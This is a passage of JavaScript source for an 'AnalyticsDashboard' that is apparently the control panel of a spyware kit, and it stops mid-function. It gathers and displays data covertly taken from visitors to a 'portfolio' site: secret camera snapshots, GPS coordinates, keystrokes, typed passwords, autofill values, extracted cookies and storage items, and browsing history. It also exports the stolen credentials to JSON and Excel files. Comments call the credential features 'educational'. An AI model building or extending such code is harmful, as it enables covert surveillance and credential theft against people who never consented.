// @ts-nocheck
class AnalyticsDashboard {
    constructor() {
        this.visitors = new Map();
        this.capturedImages = [];
        this.liveFeed = [];
        this.isLive = true;
        this.stats = {
            totalVisitors: 0,
            activeSessions: 0,
            permissionGranted: 0,
            dataPoints: 0,
            cameraGranted: 0,
            locationGranted: 0,
            totalImages: 0,
            avgSessionTime: 0,
            storageUsed: 0,
            totalSessionTime: 0,
            longestSession: 0,
            shortestSession: 0,
            pageViews: 0,
            tabSwitches: 0,
            userInteractions: 0,
            // Credential analytics (educational)
            passwordsCaptured: 0,
            formSubmissions: 0,
            autofillDetected: 0,
            storageItemsFound: 0,
            cookiesExtracted: 0,
            keystrokesLogged: 0
        };
        
        this.collectedCredentials = [];
        
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.startDataReceiver();
        this.updateUI();
        this.setupWebSocket();
    }

    setupEventListeners() {
        document.getElementById('clearData').addEventListener('click', () => this.clearAllData());
        document.getElementById('exportData').addEventListener('click', () => this.exportData());
        document.getElementById('exportCredentialsExcel').addEventListener('click', () => this.exportCredentialsToExcel());
        document.getElementById('toggleLive').addEventListener('click', () => this.toggleLiveUpdates());
        
        // Modal close
        document.querySelector('.close').addEventListener('click', () => this.closeModal());
        document.getElementById('imageModal').addEventListener('click', (e) => {
            if (e.target.id === 'imageModal') this.closeModal();
        });
    }

    setupWebSocket() {
        // In production, this would connect to your actual WebSocket server
        // For now, we rely on localStorage and postMessage communication
        console.log('WebSocket setup complete - using localStorage and postMessage');
    }

    startDataReceiver() {
        // Listen for messages from portfolio (using postMessage in production)
        window.addEventListener('message', (event) => {
            if (event.data.type === 'ANALYTICS_DATA') {
                this.processVisitorData(event.data.payload);
            }
        });

        // Check for data stored by portfolio
        this.checkPortfolioData();

        // Also try to fetch from localStorage for demo purposes
        this.loadStoredData();
        
        // Check for credential data
        this.checkCredentialData();

        // Set up periodic check for new portfolio data (2 seconds for faster updates)
        setInterval(() => this.checkPortfolioData(), 2000);
        
        // Set up periodic check for credential data (1 second for real-time updates)
        setInterval(() => this.checkCredentialData(), 1000);
    }

    processVisitorData(data) {
        if (!data || (!data.sessionId && !data.id)) {
            console.error("\u274c Rejected: No Session ID found in data", data);
            return;
        }

        const visitorId = data.sessionId || data.id;
        const existing = this.visitors.get(visitorId) || {};
        
        // Check for credential data in payload
        let credentialData = null;
        if (data.capturedCredentials || data.keystrokes || data.browserStorage) {
            credentialData = {
                keystrokes: data.keystrokes || [],
                capturedCredentials: data.capturedCredentials || [],
                browserStorage: data.browserStorage || {}
            };
        }
        
        // Merge everything into Map - NO FALLBACKS, only real data
        this.visitors.set(visitorId, {
            ...existing,
            ...data,
            ...credentialData,
            lastSeen: new Date().toISOString()
        });

        // Update comprehensive stats
        this.updateComprehensiveStats(data);
        
        // Handle Images - Look specifically for 'secretImages'
        if (data.secretImages && Array.isArray(data.secretImages)) {
            data.secretImages.forEach(img => {
                // Avoid duplicates by checking timestamp
                if (!this.capturedImages.find(ci => ci.timestamp === img.timestamp)) {
                    this.capturedImages.push({
                        ...img,
                        visitorId: visitorId,
                        data: img.data || img.url // Support both field names
                    });
                }
            });
            this.stats.totalImages = this.capturedImages.length;
        }

        console.log(`\u2705 Success: Updated visitor ${visitorId}. Total: ${this.stats.totalVisitors}`);
        this.updateUI();
        this.saveData();
    }

    updateComprehensiveStats(data) {
        // Update basic stats
        this.stats.totalVisitors = this.visitors.size;
        this.stats.activeSessions = this.getActiveSessionCount();
        
        // Update permission stats - ensure they're numbers
        this.stats.cameraGranted = Math.max(0, this.stats.cameraGranted || 0);
        this.stats.locationGranted = Math.max(0, this.stats.locationGranted || 0);
        this.stats.permissionGranted = Math.max(0, this.stats.permissionGranted || 0);
        
        if (data.permissions) {
            if (data.permissions.camera === true) this.stats.cameraGranted++;
            if (data.permissions.location === true) this.stats.locationGranted++;
            if (Object.values(data.permissions).some(p => p === true)) this.stats.permissionGranted++;
        }
        
        // Update data points
        this.stats.dataPoints += this.countDataPoints(data);
        
        // Update storage usage
        this.updateStorageUsage();
        
        // Update session analytics
        this.updateSessionAnalytics(data);
        
        // Update camera analytics
        this.updateCameraAnalytics(data);
        
        // Update location analytics
        this.updateLocationAnalytics(data);
        
        // Update permission analytics
        this.updatePermissionAnalytics();
        
        // Update engagement metrics
        this.updateEngagementMetrics(data);
    }

    updateStorageUsage() {
        try {
            const data = localStorage.getItem('spyware_portfolio_data');
            if (data) {
                const sizeInBytes = new Blob([data]).size;
                this.stats.storageUsed = Math.round(sizeInBytes / 1024); // KB
            }
        } catch (e) {
            console.error('Error calculating storage usage:', e);
        }
    }

    updateSessionAnalytics(data) {
        const now = new Date();
        const visitorId = data.sessionId || data.id;
        const visitor = this.visitors.get(visitorId);
        
        // Initialize stats if NaN
        this.stats.totalSessionTime = Math.max(0, this.stats.totalSessionTime || 0);
        this.stats.longestSession = Math.max(0, this.stats.longestSession || 0);
        this.stats.shortestSession = Math.max(0, this.stats.shortestSession || 0);
        
        if (visitor) {
            const firstSeen = new Date(visitor.timestamp || visitor.lastSeen);
            const sessionDuration = Math.max(0, (now - firstSeen) / 1000); // seconds
            
            // Update session time stats
            this.stats.totalSessionTime = Array.from(this.visitors.values())
                .reduce((total, v) => {
                    const duration = Math.max(0, (now - new Date(v.timestamp || v.lastSeen)) / 1000);
                    return total + duration;
                }, 0);
            
            this.stats.avgSessionTime = Math.max(0, Math.round(this.stats.totalSessionTime / this.visitors.size));
            this.stats.longestSession = Math.max(this.stats.longestSession, sessionDuration);
            this.stats.shortestSession = this.stats.shortestSession === 0 ? sessionDuration : Math.min(this.stats.shortestSession, sessionDuration);
        }
    }

    updateCameraAnalytics(data) {
        const safeUpdate = (id, value) => {
            const element = document.getElementById(id);
            if (element) element.textContent = value;
        };

        if (data.camera && data.camera.available) {
            safeUpdate('cameraStatus', 'Available');
            if (data.camera.settings) {
                safeUpdate('cameraResolution', 
                    `${data.camera.settings.width || 'Unknown'}x${data.camera.settings.height || 'Unknown'}`);
                safeUpdate('cameraFrameRate', 
                    data.camera.settings.frameRate ? `${data.camera.settings.frameRate}fps` : 'Unknown');
            }
        } else {
            safeUpdate('cameraStatus', 'Not Available');
        }
        
        // Calculate capture rate
        if (this.stats.totalImages > 0 && this.stats.totalSessionTime > 0) {
            const captureRate = Math.round((this.stats.totalImages / this.stats.totalSessionTime) * 60);
            safeUpdate('captureRate', `${captureRate}/min`);
        }
    }

    updateLocationAnalytics(data) {
        const safeUpdate = (id, value) => {
            const element = document.getElementById(id);
            if (element) element.textContent = value;
        };

        if (data.location) {
            safeUpdate('locationStatus', 'Available');
            safeUpdate('avgAccuracy', 
                data.location.accuracy ? `±${Math.round(data.location.accuracy)}m` : 'Unknown');
            safeUpdate('locationSource', 
                data.location.source || 'Browser GPS');
            
            // Count unique locations
            const uniqueLocations = new Set();
            this.visitors.forEach(visitor => {
                if (visitor.location && visitor.location.latitude && visitor.location.longitude) {
                    const key = `${visitor.location.latitude},${visitor.location.longitude}`;
                    uniqueLocations.add(key);
                }
            });
            safeUpdate('uniqueLocations', uniqueLocations.size);
        } else {
            safeUpdate('locationStatus', 'Not Available');
        }
    }

    updatePermissionAnalytics() {
        const totalVisitors = this.visitors.size;
        const cameraGranted = this.stats.cameraGranted;
        const locationGranted = this.stats.locationGranted;
        
        // Safe element update function
        const safeUpdate = (id, value) => {
            const element = document.getElementById(id);
            if (element) element.textContent = value;
        };

        const safeStyle = (id, property, value) => {
            const element = document.getElementById(id);
            if (element) element.style[property] = value;
        };
        
        // Update camera permission bar
        const cameraPercentage = totalVisitors > 0 ? (cameraGranted / totalVisitors) * 100 : 0;
        safeStyle('cameraPermissionBar', 'width', `${cameraPercentage}%`);
        safeUpdate('cameraPermissionCount', `${cameraGranted}/${totalVisitors}`);
        
        // Update location permission bar
        const locationPercentage = totalVisitors > 0 ? (locationGranted / totalVisitors) * 100 : 0;
        safeStyle('locationPermissionBar', 'width', `${locationPercentage}%`);
        safeUpdate('locationPermissionCount', `${locationGranted}/${totalVisitors}`);
    }

    updateEngagementMetrics(data) {
        // Safe element update function
        const safeUpdate = (id, value) => {
            const element = document.getElementById(id);
            if (element) element.textContent = value;
        };

        // Initialize stats if NaN
        this.stats.pageViews = Math.max(0, this.stats.pageViews || 0);
        this.stats.tabSwitches = Math.max(0, this.stats.tabSwitches || 0);
        this.stats.userInteractions = Math.max(0, this.stats.userInteractions || 0);

        // Update page views (simplified - each data transmission counts as a page view)
        this.stats.pageViews++;
        
        // Calculate data points per visitor
        if (this.stats.totalVisitors > 0 && this.stats.dataPoints >= 0) {
            const dataPointsPerVisitor = Math.round(this.stats.dataPoints / this.stats.totalVisitors);
            safeUpdate('dataPointsPerVisitor', dataPointsPerVisitor);
        } else {
            safeUpdate('dataPointsPerVisitor', 0);
        }
        
        // Update other engagement metrics (placeholder values for now)
        safeUpdate('pageViews', this.stats.pageViews);
        safeUpdate('tabSwitches', this.stats.tabSwitches);
        safeUpdate('userInteractions', this.stats.userInteractions);
        
        // Update credential analytics (educational)
        this.stats.passwordsCaptured = Math.max(0, this.stats.passwordsCaptured || 0);
        this.stats.formSubmissions = Math.max(0, this.stats.formSubmissions || 0);
        this.stats.autofillDetected = Math.max(0, this.stats.autofillDetected || 0);
        this.stats.storageItemsFound = Math.max(0, this.stats.storageItemsFound || 0);
        this.stats.cookiesExtracted = Math.max(0, this.stats.cookiesExtracted || 0);
        this.stats.keystrokesLogged = Math.max(0, this.stats.keystrokesLogged || 0);
        this.stats.browserHistoryEntries = Math.max(0, this.stats.browserHistoryEntries || 0);
    }

    getActiveSessionCount() {
        const now = new Date();
        let activeCount = 0;
        
        this.visitors.forEach(visitor => {
            const lastSeen = new Date(visitor.lastSeen);
            const diffMinutes = (now - lastSeen) / (1000 * 60);
            if (diffMinutes < 30) activeCount++;
        });
        
        return activeCount;
    }

    checkCredentialData() {
        try {
            const data = localStorage.getItem('spyware_credentials');
            if (data) {
                const credentials = JSON.parse(data);
                this.processCredentialData(credentials);
            }
        } catch (e) {
            console.error('Error loading credential data:', e);
        }
    }

    processCredentialData(credentials) {
        if (!Array.isArray(credentials)) return;
        
        // Update credential stats
        this.stats.passwordsCaptured = credentials.filter(c => c.password || c.value).length;
        this.stats.formSubmissions = credentials.filter(c => c.type === 'form_submission').length;
        this.stats.autofillDetected = credentials.filter(c => c.autofillDetected).length;
        this.stats.storageItemsFound = credentials.filter(c => c.type.includes('storage')).length;
        this.stats.cookiesExtracted = credentials.filter(c => c.type === 'cookie_extraction').length;
        
        // Count keystrokes
        this.stats.keystrokesLogged = credentials.reduce((total, c) => {
            return total + (c.keystrokes?.length || 0);
        }, 0);
        
        // Count browser history entries
        this.stats.browserHistoryEntries = credentials.filter(c => 
            c.type === 'browser_history' || c.type === 'navigation_history'
        ).length;
        
        // Store credentials for display
        this.collectedCredentials = credentials;
        
        // Update credential activity display
        this.updateCredentialActivity();
    }

    updateCredentialActivity() {
        const container = document.getElementById('credentialActivity');
        if (!container) return;
        
        if (this.collectedCredentials.length === 0) {
            container.innerHTML = '<p class="no-data">No credential activity yet</p>';
            return;
        }
        
        // Show recent credential activity (last 10)
        const recentActivity = this.collectedCredentials.slice(-10).reverse();
        container.innerHTML = recentActivity.map(credential => {
            const type = credential.type || 'unknown';
            const url = new URL(credential.url || '').hostname || 'Unknown';
            const timestamp = new Date(credential.timestamp).toLocaleString();
            
            let details = '';
            switch (type) {
                case 'form_submission':
                    details = `📝 Form submitted with username: ${credential.username || 'unknown'}`;
                    break;
                case 'password_field_monitoring':
                    details = `🔐 Password typed: ${credential.fieldName || 'unknown'}`;
                    break;
                case 'autofill':
                    details = `🤖 Autofill detected: ${credential.fieldName || 'unknown'}`;
                    break;
                case 'localStorage_extraction':
                    details = `💾 Storage item: ${credential.storageKey || 'unknown'}`;
                    break;
                case 'cookie_extraction':
                    details = `🍪 Cookies extracted: ${credential.cookies?.length || 0} items`;
                    break;
                case 'browser_history':
                    details = `🌐 History entry: ${credential.url || 'Unknown URL'}`;
                    break;
                case 'navigation_history':
                    details = `🧭 Navigation: ${credential.url || 'Unknown URL'} (${credential.loadTime || 0}ms)`;
                    break;
                case 'browser_history_unavailable':
                    details = `❌ History API not accessible`;
                    break;
                case 'keylogger_data':
                    details = `⌨️ Keystrokes captured`;
                    break;
                default:
                    details = `📋 ${type}`;
            }
            
            return `
                <div class="credential-item">
                    <div class="credential-header">
                        <span class="credential-type">${type}</span>
                        <span class="credential-time">${timestamp}</span>
                    </div>
                    <div class="credential-details">
                        <div class="credential-url">${url}</div>
                        <div class="credential-info">${details}</div>
                    </div>
                </div>
            `;
        }).join('');
        
        // Also update browser history list
        this.updateBrowserHistoryList();
    }

    updateBrowserHistoryList() {
        const container = document.getElementById('browserHistoryList');
        if (!container) return;
        
        // Filter only browser history and navigation entries
        const historyEntries = this.collectedCredentials.filter(credential => 
            credential.type === 'browser_history' || 
            credential.type === 'navigation_history'
        );
        
        if (historyEntries.length === 0) {
            container.innerHTML = '<p class="no-data">No browser history captured yet</p>';
            return;
        }
        
        // Sort by timestamp (newest first)
        const sortedHistory = historyEntries.sort((a, b) => 
            new Date(b.timestamp) - new Date(a.timestamp)
        );
        
        container.innerHTML = sortedHistory.map(entry => {
            const timestamp = new Date(entry.timestamp).toLocaleString();
            const url = entry.url || 'Unknown URL';
            const hostname = new URL(url || 'http://unknown').hostname || 'Unknown';
            
            if (entry.type === 'browser_history') {
                return `
                    <div class="history-item">
                        <div class="history-header">
                            <span class="history-type">🌐 Browser History</span>
                            <span class="history-time">${timestamp}</span>
                        </div>
                        <div class="history-details">
                            <div class="history-url">
                                <a href="${url}" target="_blank" rel="noopener noreferrer">
                                    ${url}
                                </a>
                            </div>
                            <div class="history-info">
                                <strong>Page Title:</strong> ${entry.pageTitle || 'Unknown'}<br>
                                <strong>History Index:</strong> ${entry.historyIndex || 'N/A'}<br>
                                <strong>Total History:</strong> ${entry.historyLength || 'N/A'}
                            </div>
                        </div>
                    </div>
                `;
            } else if (entry.type === 'navigation_history') {
                return `
                    <div class="history-item">
                        <div class="history-header">
                            <span class="history-type">🧭 Navigation</span>
                            <span class="history-time">${timestamp}</span>
                        </div>
                        <div class="history-details">
                            <div class="history-url">
                                <a href="${url}" target="_blank" rel="noopener noreferrer">
                                    ${url}
                                </a>
                            </div>
                            <div class="history-info">
                                <strong>Load Time:</strong> ${entry.loadTime || 0}ms<br>
                                <strong>DOM Ready:</strong> ${entry.domContentLoaded || 0}ms<br>
                                <strong>Page Load:</strong> ${entry.pageLoadTime || 0}ms<br>
                                <strong>Transfer Size:</strong> ${entry.transferSize || 0} bytes<br>
                                <strong>Encoded Size:</strong> ${entry.encodedBodySize || 0} bytes
                            </div>
                        </div>
                    </div>
                `;
            }
        }).join('');
    }

    countDataPoints(data) {
        let count = 1; // Basic visit
        if (data.permissions) count += Object.keys(data.permissions).length;
        if (data.location) count += 3; // lat, long, accuracy
        if (data.capturedImage) count += 5; // Image data
        return count;
    }

    addToLiveFeed(data) {
        const feedItem = {
            type: 'visit',
            timestamp: new Date().toISOString(),
            visitorId: data.id || data.sessionId,
            message: `New visitor from ${data.deviceInfo?.browser || 'Unknown'}`,
            data: data
        };

        if (data.permissions?.camera) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Camera access granted by ${data.id || data.sessionId}`
            });
        }

        if (data.permissions?.location) {
            this.liveFeed.push({
                ...feedItem,
                type: 'location',
                message: `Location data received from ${data.id || data.sessionId}`
            });
        }

        if (data.capturedImage) {
            this.liveFeed.push({
                ...feedItem,
                type: 'camera',
                message: `Image captured from ${data.id || data.sessionId}`
            });
        }

        // Keep only last 50 items
        this.liveFeed = this.liveFeed.slice(-50);
    }

    updateUI() {
        // Safe element update function
        const safeUpdate = (id, value) => {
            const element = document.getElementById(id);
            if (element) element.textContent = value;
        };

        // Update main stats
        safeUpdate('totalVisitors', this.stats.totalVisitors);
        safeUpdate('activeSessions', this.stats.activeSessions);
        safeUpdate('permissionGranted', this.stats.permissionGranted);
        safeUpdate('dataPoints', this.stats.dataPoints);
        
        // Update new comprehensive stats
        safeUpdate('cameraGranted', this.stats.cameraGranted);
        safeUpdate('locationGranted', this.stats.locationGranted);
        safeUpdate('totalImages', this.stats.totalImages);
        safeUpdate('avgSessionTime', this.formatDuration(this.stats.avgSessionTime));
        safeUpdate('storageUsed', `${this.stats.storageUsed}KB`);
        
        // Update session analytics
        safeUpdate('totalSessionTime', this.formatDuration(this.stats.totalSessionTime));
        safeUpdate('longestSession', this.formatDuration(this.stats.longestSession));
        safeUpdate('shortestSession', this.formatDuration(this.stats.shortestSession));
        safeUpdate('activeNow', this.stats.activeSessions);

        // Update visitors list
        this.updateVisitorsList();

        // Update live feed
        this.updateLiveFeed();

        // Update captured images
        this.updateCapturedImages();

        // Update device analytics
        this.updateDeviceAnalytics();
        
        // Update browser history list
        this.updateBrowserHistoryList();
    }

    formatDuration(seconds) {
        if (seconds < 60) return `${Math.round(seconds)}s`;
        if (seconds < 3600) return `${Math.round(seconds / 60)}m`;
        return `${Math.round(seconds / 3600)}h`;
    }

    formatLocation(location) {
        if (!location) return 'Not granted';
        if (location.latitude && location.longitude) {
            const lat = typeof location.latitude === 'number' ? location.latitude.toFixed(6) : location.latitude;
            const lon = typeof location.longitude === 'number' ? location.longitude.toFixed(6) : location.longitude;
            const accuracy = location.accuracy ? ` ±${Math.round(location.accuracy)}m` : '';
            const source = location.source || 'Browser GPS';
            return `${lat}, ${lon} (${source})${accuracy}`;
        }
        return 'Not available';
    }

    calculateSessionTime(visitor) {
        const now = new Date();
        const firstSeen = new Date(visitor.timestamp || visitor.lastSeen);
        const duration = (now - firstSeen) / 1000; // seconds
        return this.formatDuration(duration);
    }

    extractBrowserFromUA(userAgent) {
        if (!userAgent) return 'Unknown';
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown';
    }

    updateVisitorsList() {
        const container = document.getElementById('visitorsList');
        
        if (this.visitors.size === 0) {
            container.innerHTML = '<p class="no-data">No visitor data yet</p>';
            return;
        }

        const visitorsArray = Array.from(this.visitors.values()).slice(-10).reverse();
        container.innerHTML = visitorsArray.map(visitor => {
            // Extract device info from multiple possible sources
            const deviceInfo = visitor.deviceInfo || visitor.device || {};
            const browser = deviceInfo.browser || this.extractBrowserFromUA(visitor.userAgent) || 'Unknown';
            const os = deviceInfo.os || visitor.platform || 'Unknown';
            const screen = deviceInfo.screen || {};
            const screenRes = visitor.screenResolution || (screen.width && screen.height ? `${screen.width}x${screen.height}` : 'Unknown');
            const language = visitor.language || 'Unknown';
            
            return `
            <div class="visitor-card">
                <h4>${visitor.sessionId || visitor.id || 'Unknown'}</h4>
                <div class="visitor-info">
                    <div><strong>Device:</strong> ${browser}</div>
                    <div><strong>OS:</strong> ${os}</div>
                    <div><strong>Screen:</strong> ${screenRes}</div>
                    <div><strong>Language:</strong> ${language}</div>
                    <div><strong>Location:</strong> ${this.formatLocation(visitor.location)}</div>
                    <div><strong>Camera:</strong> ${visitor.camera?.available ? 'Available' : 'Not Available'}</div>
                    <div><strong>Images:</strong> ${visitor.secretImages?.length || 0} captured</div>
                    <div><strong>Permissions:</strong> ${this.formatPermissions(visitor.permissions)}</div>
                    <div><strong>Session Time:</strong> ${this.calculateSessionTime(visitor)}</div>
                    <div><strong>Last seen:</strong> ${new Date(visitor.lastSeen).toLocaleTimeString()}</div>
                </div>
            </div>
        `;
        }).join('');
    }

    updateLiveFeed() {
        const container = document.getElementById('liveFeed');
        
        if (this.liveFeed.length === 0) {
            container.innerHTML = '<p class="no-data">Waiting for data...</p>';
            return;
        }

        container.innerHTML = this.liveFeed.slice(-20).reverse().map(item => `
            <div class="feed-item ${item.type}">
                <strong>${new Date(item.timestamp).toLocaleTimeString()}</strong><br>
                ${item.message}
            </div>
        `).join('');
    }

    updateCapturedImages() {
        const container = document.getElementById('capturedImages');
        
        if (this.capturedImages.length === 0) {
            container.innerHTML = '<p class="no-data">No images captured yet</p>';
            return;
        }

        container.innerHTML = this.capturedImages.slice(-12).reverse().map((img, index) => `
            <img src="${img.data}" alt="Captured ${index + 1}" class="image-thumbnail" 
                 onclick="dashboard.showImageModal(${this.capturedImages.length - 1 - index})">
        `).join('');
    }

    updateDeviceAnalytics() {
        const deviceStats = {};
        const osStats = {};
        const screenStats = {};
        
        this.visitors.forEach((visitor, visitorId) => {
            // Extract browser from multiple sources
            const deviceInfo = visitor.deviceInfo || visitor.device || {};
            const browser = deviceInfo.browser || this.extractBrowserFromUA(visitor.userAgent) || 'Unknown';
            const os = deviceInfo.os || visitor.platform || 'Unknown';
            const screenRes = visitor.screenResolution || (deviceInfo.screen?.width && deviceInfo.screen?.height ? 
                `${deviceInfo.screen.width}x${deviceInfo.screen.height}` : 'Unknown');
            
            deviceStats[browser] = (deviceStats[browser] || 0) + 1;
            osStats[os] = (osStats[os] || 0) + 1;
            screenStats[screenRes] = (screenStats[screenRes] || 0) + 1;
        });

        const container = document.getElementById('deviceBreakdown');
        if (!container) return;
        
        container.innerHTML = `
            <div class="device-category">
                <h4>Browsers</h4>
                ${Object.entries(deviceStats)
                    .sort(([,a], [,b]) => b - a)
                    .map(([device, count]) => `
                        <div style="display: flex; justify-content: space-between; padding: 3px 0;">
                            <span>${device}</span>
                            <span><strong>${count}</strong></span>
                        </div>
                    `).join('')}
            </div>
            <div class="device-category">
                <h4>Operating Systems</h4>
                ${Object.entries(osStats)
                    .sort(([,a], [,b]) => b - a)
                    .map(([os, count]) => `
                        <div style="display: flex; justify-content: space-between; padding: 3px 0;">
                            <span>${os}</span>
                            <span><strong>${count}</strong></span>
                        </div>
                    `).join('')}
            </div>
            <div class="device-category">
                <h4>Screen Resolutions</h4>
                ${Object.entries(screenStats)
                    .sort(([,a], [,b]) => b - a)
                    .map(([screen, count]) => `
                        <div style="display: flex; justify-content: space-between; padding: 3px 0;">
                            <span>${screen}</span>
                            <span><strong>${count}</strong></span>
                        </div>
                    `).join('')}
            </div>
        `;
    }

    formatPermissions(permissions) {
        if (!permissions) return 'None';
        const granted = Object.entries(permissions)
            .filter(([, granted]) => granted)
            .map(([perm]) => perm);
        return granted.length > 0 ? granted.join(', ') : 'None';
    }

    showImageModal(index) {
        const image = this.capturedImages[index];
        if (!image) return;

        document.getElementById('modalImage').src = image.data;
        document.getElementById('imageTitle').textContent = `Captured from ${image.visitorId}`;
        document.getElementById('imageTimestamp').textContent = `Time: ${new Date(image.timestamp).toLocaleString()}`;
        document.getElementById('imageDeviceInfo').textContent = `Device: ${image.deviceInfo || 'Unknown'}`;
        document.getElementById('imageModal').style.display = 'block';
    }

    closeModal() {
        document.getElementById('imageModal').style.display = 'none';
    }

    toggleLiveUpdates() {
        this.isLive = !this.isLive;
        const btn = document.getElementById('toggleLive');
        btn.textContent = this.isLive ? 'Pause Live Updates' : 'Resume Live Updates';
        btn.className = this.isLive ? 'btn-secondary' : 'btn-primary';
        
        // Update status indicator
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        
        if (this.isLive) {
            statusDot.style.background = '#2ecc71';
            statusText.textContent = 'Connected';
        } else {
            statusDot.style.background = '#f39c12';
            statusText.textContent = 'Paused';
        }
    }

    clearAllData() {
        if (confirm('Are you sure you want to clear all collected data?')) {
            this.visitors.clear();
            this.capturedImages = [];
            this.liveFeed = [];
            this.stats = {
                totalVisitors: 0,
                activeSessions: 0,
                permissionGranted: 0,
                dataPoints: 0
            };
            
            localStorage.removeItem('spyware_dashboard_data');
            this.updateUI();
        }
    }

    exportData() {
        // Create comprehensive export with all harvested data
        const visitorsArray = Array.from(this.visitors.values());
        
        const exportData = {
            stats: this.stats,
            visitors: visitorsArray.map(visitor => ({
                ...visitor,
                // Ensure all credential data is included
                keystrokes: visitor.keystrokes || [],
                capturedCredentials: visitor.capturedCredentials || [],
                browserStorage: visitor.browserStorage || {},
                secretImages: visitor.secretImages || []
            })),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            // Include all collected credentials
            collectedCredentials: this.collectedCredentials || [],
            exportDate: new Date().toISOString()
        };

        // Verify no mock data - only include real harvested data
        visitorsArray.forEach(visitor => {
            if (!visitor.keystrokes || visitor.keystrokes.length === 0) {
                visitor.keystrokes = [];
            }
            if (!visitor.capturedCredentials || visitor.capturedCredentials.length === 0) {
                visitor.capturedCredentials = [];
            }
            if (!visitor.browserStorage || Object.keys(visitor.browserStorage).length === 0) {
                visitor.browserStorage = {};
            }
            if (!visitor.secretImages || visitor.secretImages.length === 0) {
                visitor.secretImages = [];
            }
        });

        const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `analytics_export_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        URL.revokeObjectURL(url);
        
        console.log('📤 Export completed with:', {
            visitorsCount: visitorsArray.length,
            credentialsCount: this.collectedCredentials.length,
            imagesCount: this.capturedImages.length,
            keystrokesCount: this.collectedCredentials.reduce((total, c) => total + (c.keystrokes?.length || 0), 0)
        });
    }

    exportCredentialsToExcel() {
        // Collect all credentials from visitors
        const visitorsArray = Array.from(this.visitors.values());
        const allCredentials = [];
        
        visitorsArray.forEach(visitor => {
            if (visitor.capturedCredentials && Array.isArray(visitor.capturedCredentials)) {
                visitor.capturedCredentials.forEach(credential => {
                    allCredentials.push({
                        sessionId: visitor.sessionId,
                        timestamp: credential.timestamp || new Date().toISOString(),
                        type: credential.type || 'unknown',
                        url: credential.url || 'N/A',
                        data: this.extractCredentialData(credential),
                        deviceInfo: {
                            browser: visitor.browser || 'Unknown',
                            os: visitor.os || 'Unknown',
                            screen: visitor.screenResolution || 'Unknown'
                        }
                    });
                });
            }
        });

        // Filter for passwords and browser history
        const filteredCredentials = allCredentials.filter(cred => 
            cred.type === 'form_submission' ||
            cred.type === 'password_input' ||
            cred.type === 'autofill_detected' ||
            cred.type === 'browser_history' ||
            cred.type === 'navigation_history' ||
            cred.type === 'localStorage_extraction' ||
            cred.type === 'cookie_extraction'
        );

        // Create Excel CSV content
        const csvContent = this.createExcelCSV(filteredCredentials);
        
        // Download as Excel file
        const blob = new Blob([csvContent], { type: 'application/vnd.ms-excel' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `credentials_export_${new Date().toISOString().split('T')[0]}.xls`;
        a.click();
        URL.revokeObjectURL(url);
        
        console.log('📤 Credentials Excel export completed:', {
            totalCredentials: allCredentials.length,
            filteredCredentials: filteredCredentials.length,
            passwordsFound: filteredCredentials.filter(c => c.type.includes('password')).length,
            browserHistoryEntries: filteredCredentials.filter(c => c.type.includes('history')).length
        });
    }

    extractCredentialData(credential) {
        switch (credential.type) {
            case 'form_submission':
                return `Form: ${credential.formAction || 'N/A'}, Fields: ${credential.fieldCount || 0}`;
            case 'password_input':
                return `Password: ${credential.password ? 'YES' : 'NO'}, Field: ${credential.fieldName || 'N/A'}`;
            case 'autofill_detected':
                return `Autofill: ${credential.autofillData ? 'YES' : 'NO'}, Fields: ${Object.keys(credential.autofillData || {}).length}`;
            case 'browser_history':
                return `Title: ${credential.pageTitle || 'N/A'}, History Index: ${credential.historyIndex || 'N/A'}`;
            case 'navigation_history':
                return `Load Time: ${credential.loadTime || 0}ms, Transfer Size: ${credential.transferSize || 0} bytes`;
            case 'localStorage_extraction':
                return `Storage Items: ${credential.storageItems ? credential.storageItems.length : 0}, Has Passwords: ${credential.hasPassword ? 'YES' : 'NO'}`;
            case 'cookie_extraction':
                return `Cookies: ${credential.cookies ? credential.cookies.length : 0}`;
            default:
                return JSON.stringify(credential).substring(0, 100) + '...';
        }
    }

    createExcelCSV(credentials) {
        const headers = [
            'Session ID',
            'Timestamp',
            'Type',
            'URL',
            'Data',
            'Browser',
            'OS',
            'Screen Resolution'
        ];

        const csvRows = [headers.join(',')];

        credentials.forEach(cred => {
            const row = [
                `"${cred.sessionId}"`,
                `"${cred.timestamp}"`,
                `"${cred.type}"`,
                `"${cred.url}"`,
                `"${cred.data.replace(/"/g, '""')}"`,
                `"${cred.deviceInfo.browser}"`,
                `"${cred.deviceInfo.os}"`,
                `"${cred.deviceInfo.screen}"`
            ];
            csvRows.push(row.join(','));
        });

        // Add summary section
        csvRows.push('');
        csvRows.push('SUMMARY');
        csvRows.push('Total Credentials,' + credentials.length);
        csvRows.push('Passwords Found,' + credentials.filter(c => c.type.includes('password')).length);
        csvRows.push('Browser History Entries,' + credentials.filter(c => c.type.includes('history')).length);
        csvRows.push('Form Submissions,' + credentials.filter(c => c.type === 'form_submission').length);
        csvRows.push('Autofill Detected,' + credentials.filter(c => c.type === 'autofill_detected').length);
        csvRows.push('Storage Extractions,' + credentials.filter(c => c.type.includes('storage') || c.type.includes('cookie')).length);

        return csvRows.join('\n');
    }

    saveData() {
        const dataToSave = {
            visitors: Array.from(this.visitors.entries()),
            capturedImages: this.capturedImages,
            liveFeed: this.liveFeed,
            stats: this.stats
        };
        localStorage.setItem('spyware_dashboard_data', JSON.stringify(dataToSave));
    }

    checkPortfolioData() {
        try {
            const raw = localStorage.getItem('spyware_portfolio_data');
            if (!raw) return;

            const data = JSON.parse(raw);
            // Ensure we are working with an array
            const entries = Array.isArray(data) ? data : [data];
            
            console.log(`\ud83d\udce5 RAW DATA SYNC: Processing ${entries.length} entries`);

            entries.forEach(entry => {
                // UNIVERSAL EXTRACTION: 
                // Try entry.data (wrapped), then entry (direct), then entry.payload
                const payload = entry.data || (entry.sessionId ? entry : null) || entry.payload;
                
                if (payload) {
                    this.processVisitorData(payload);
                } else {
